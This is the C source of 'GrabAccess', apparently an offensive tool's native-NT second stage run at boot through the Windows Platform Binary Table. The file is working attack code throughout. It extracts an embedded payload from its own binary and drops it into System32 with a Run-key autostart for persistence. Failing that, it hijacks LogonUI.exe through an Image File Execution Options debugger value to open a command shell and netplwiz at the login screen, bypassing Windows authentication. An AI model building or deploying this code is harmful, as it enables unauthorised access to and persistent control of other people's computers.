//======================================================================
//
// GrabAccess Native APP 1.1.0
// This is the second stage of GrabAccess.
// During the windows startup phase, Windows Platform Binary Table will output and run this program in:
// C://windows/system/wpbbin.exe
//
// Windows Platform Binary Table can only load Native NT applications.
// Which run outside of the Win32 environment and must rely on the raw services provided by NTDLL.DLL. 
// AUTOCHK (the program that executes a chkdsk activity during the system boot) is an example.
// 
// Refer to:
// https://fox28813018.blogspot.com/2019/05/windows-platform-binary-table-wpbt-wpbt.html
//
//======================================================================

#include "ntddk.h"
#include "stdio.h"
#include "native.h"

HANDLE Heap;
HANDLE g_hHeap = NULL;

RtlGetProcessHeap(IN ULONG  MaxNumberOfHeaps, OUT PVOID *HeapArray );

// Print a Unicode string during windows native env
void print(PWCHAR pwmsg){
	UNICODE_STRING msg;
	RtlInitUnicodeString(&msg,pwmsg);
	NtDisplayString(&msg);
}

// Memory Control
HANDLE InitHeapMemory(void){
	g_hHeap = RtlCreateHeap(0x00000002, NULL, 0x100000, 0x1000, NULL,NULL); //HEAP_GROWABLE
	return g_hHeap;
}

BOOLEAN DeinitHeapMemory(){
	PVOID pRet;
	pRet = RtlDestroyHeap(g_hHeap);
	if (pRet == NULL) {
		g_hHeap = NULL;
		return TRUE;
	}
	return FALSE;
}

void free(void *pMem){
	RtlFreeHeap(g_hHeap, 0, pMem);
}

void *malloc(unsigned long ulSize){
	return RtlAllocateHeap(g_hHeap, 0, ulSize);
}


// File Control
BOOLEAN NtFileGetFileSize(HANDLE hFile, LONGLONG* pRetFileSize)
{
  IO_STATUS_BLOCK sIoStatus;
  FILE_STANDARD_INFORMATION sFileInfo;
  NTSTATUS ntStatus = 0;
  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));
  memset(&sFileInfo, 0, sizeof(FILE_STANDARD_INFORMATION));
  ntStatus = NtQueryInformationFile(hFile, &sIoStatus, &sFileInfo,
    sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
  if (ntStatus == STATUS_SUCCESS){
    if (pRetFileSize){
      *pRetFileSize = (sFileInfo.EndOfFile.QuadPart);
    }
    return TRUE;
  }
  return FALSE;
}

BOOLEAN NtFileReadFile(HANDLE hFile, PVOID pOutBuffer, ULONG dwOutBufferSize, ULONG* pRetReadedSize)
{
  IO_STATUS_BLOCK sIoStatus;
  NTSTATUS ntStatus = 0;
  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));
  ntStatus = NtReadFile( hFile, NULL, NULL, NULL, &sIoStatus, pOutBuffer, dwOutBufferSize, NULL, NULL);
  if (ntStatus == STATUS_SUCCESS) {
    if (pRetReadedSize) {
      *pRetReadedSize = (ULONG)sIoStatus.Information;
    }
    return TRUE;
  }
  return FALSE;
}

BOOLEAN NtFileWriteFile(HANDLE hFile, PVOID lpData, ULONG dwBufferSize, ULONG* pRetWrittenSize)
{
  IO_STATUS_BLOCK sIoStatus;
  NTSTATUS ntStatus = 0;
  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));	
  ntStatus = NtWriteFile(hFile, NULL, NULL, NULL, &sIoStatus, lpData, dwBufferSize, NULL, NULL);
  if (ntStatus == STATUS_SUCCESS) {
    if (pRetWrittenSize) {
      *pRetWrittenSize = (ULONG)sIoStatus.Information;
    }
    return TRUE;
  }
  return FALSE;
}

BOOLEAN NtFileWriteFileByOffset(HANDLE hFile, PVOID lpData, ULONG dwBufferSize, ULONG* pRetWrittenSize , ULONG Offset)
{
  IO_STATUS_BLOCK sIoStatus;
  NTSTATUS ntStatus = 0;
  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));	
  ntStatus = NtWriteFile(hFile, NULL, NULL, NULL, &sIoStatus, lpData, dwBufferSize, (PLARGE_INTEGER)Offset, NULL);
  if (ntStatus == STATUS_SUCCESS) {
    if (pRetWrittenSize) {
      *pRetWrittenSize = (ULONG)sIoStatus.Information;
    }
    return TRUE;
  }
  return FALSE;
}

// Registry Control
void setRegistryValue(WCHAR* keyName, WCHAR* valueName, WCHAR* value, ULONG valueType)
{
  UNICODE_STRING KeyName, ValueName;
  HANDLE SoftwareKeyHandle;
  ULONG Status;
  OBJECT_ATTRIBUTES ObjectAttributes;
  ULONG Disposition;
  UNICODE_STRING tempString;
  int Result = 0;
  WCHAR storage[256];
  RtlInitUnicodeString(&KeyName, keyName);
  InitializeObjectAttributes(&ObjectAttributes,&KeyName,OBJ_CASE_INSENSITIVE,NULL,NULL);
  Status = ZwCreateKey(&SoftwareKeyHandle,KEY_ALL_ACCESS,&ObjectAttributes,0,NULL,REG_OPTION_NON_VOLATILE,&Disposition);
  RtlInitUnicodeString(&ValueName, valueName);
  Status = ZwSetValueKey(SoftwareKeyHandle,&ValueName,0,valueType,value,(wcslen(value) + 1) * sizeof(WCHAR));
  Status = ZwClose(SoftwareKeyHandle);
}


//----------------------------------------------------------------------
// NtProcessStartup
// Instead of a 'main', NT applications are entered via this entry point.  
//----------------------------------------------------------------------
void NtProcessStartup( PSTARTUP_ARGUMENT Argument ){
  int index,offset,AppStart,AppEnd,AppSize;
  NTSTATUS status;
  HANDLE FileHandle;
  HANDLE TargetFileHandle;
  IO_STATUS_BLOCK isb;
  IO_STATUS_BLOCK Writeisb;
  OBJECT_ATTRIBUTES obj;
  UNICODE_STRING str;
  ULONG FileSize;
  BOOLEAN bResult = 0;
  ULONG dwReadedSize = 0;
  ULONG dwWriteSize = 0;
  unsigned char *WriteBuffer;
  unsigned char *byData;
  LONGLONG lFileSize = 0;	
  WCHAR storage[256];

  WCHAR Wpbtbin[]= L"\\??\\\\C:\\Windows\\System32\\Wpbbin.exe";
  WCHAR PayloadFile[]= L"\\??\\\\C:\\Windows\\System32\\GrabAccess.exe";
  WCHAR PayloadPath[]	=	L"C:\\Windows\\System32\\GrabAccess.exe";

  WCHAR IFEO[]	=	L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe";
  WCHAR IFEO_cmd[]	=	L"cmd.exe /c start explorer.exe & start netplwiz.exe & start /wait cmd.exe & reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe\" /f &  ";

  WCHAR AutoRun[]	=	L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";


	InitHeapMemory();

  //Read Payload From Wpbtbin.exe
	RtlInitUnicodeString(&str, Wpbtbin);
  InitializeObjectAttributes(&obj, &str, OBJ_CASE_INSENSITIVE, NULL, NULL)
  status = NtCreateFile(&FileHandle, FILE_GENERIC_READ, &obj, &isb, 0,FILE_ATTRIBUTE_NORMAL,FILE_SHARE_READ, FILE_OPEN,FILE_RANDOM_ACCESS|FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	bResult = NtFileGetFileSize(FileHandle, &lFileSize);
	byData = malloc((unsigned long)lFileSize);
  dwReadedSize = 0;
  NtFileReadFile(FileHandle, byData, (ULONG)lFileSize, &dwReadedSize); 	
  offset = 0;
	
	AppStart = 0;
	AppEnd = 0;
	AppSize = 0;
	
	for(index=0;index<lFileSize;index++){
		// looking for <UU>
		// we will ignore first found <UU> ... 
		if (*(volatile unsigned long *)(byData + index ) == 0x3E55553C
		&& *(volatile unsigned long *)(byData + index - 4 ) == 0x00000000 )
		{
			if (AppStart != 0 && AppEnd == 0){
				AppEnd = index ;
				AppSize = AppEnd - AppStart;							
				break;
			}

			if (AppStart == 0){
				AppStart = index + 4;
			}
		}
	}

  if (AppSize !=0){
    WriteBuffer = malloc((unsigned long)AppSize);
    
    for(index=0;index<AppSize;index++){
      *(volatile unsigned long *)(WriteBuffer  + index ) = *(volatile unsigned long *)(byData + AppStart + index );
    }
    
    //Write Payload to Disk
    RtlInitUnicodeString(&str, PayloadFile);
    InitializeObjectAttributes(&obj, &str, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtCreateFile(&TargetFileHandle, FILE_GENERIC_WRITE, &obj, &Writeisb, 0,FILE_ATTRIBUTE_NORMAL,FILE_SHARE_WRITE, FILE_OVERWRITE_IF,FILE_RANDOM_ACCESS|FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);	
    NtFileWriteFile(TargetFileHandle, WriteBuffer, AppSize, &dwWriteSize);
    NtClose(TargetFileHandle);	
    NtClose(FileHandle);
    free(byData);

    //Set AutoRun
    setRegistryValue(AutoRun,L"GrabAccess",PayloadPath,REG_SZ);	
  }
  else{
    //Hijack Logonui.exe to netplwiz.exe
    setRegistryValue(IFEO,L"Debugger",IFEO_cmd,REG_SZ);
  }

  DeinitHeapMemory();
  NtTerminateProcess( NtCurrentProcess(), 0 );
}